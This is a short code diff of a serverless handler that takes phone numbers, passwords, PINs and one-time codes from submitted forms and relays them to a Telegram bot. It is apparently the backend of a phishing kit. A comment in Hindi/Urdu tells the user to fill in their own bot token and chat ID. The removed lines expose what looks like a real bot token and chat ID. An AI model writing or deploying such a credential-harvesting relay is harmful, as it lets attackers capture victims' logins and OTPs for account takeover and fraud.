@@ -6,8 +6,8 @@ export default async function handler(req, res) {
     const { type, phone, password, pin, otp } = req.body;
 
     // Yahan apna Telegram Bot Token aur Chat ID daal dein
-    const BOT_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-    const CHAT_ID = '6076330929';
+    const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
     let message = '';
 
@@ -20,8 +20,7 @@ export default async function handler(req, res) {
     }
 
     try {
-        const response = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const telegramRes = await fetch(response, {
+        const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
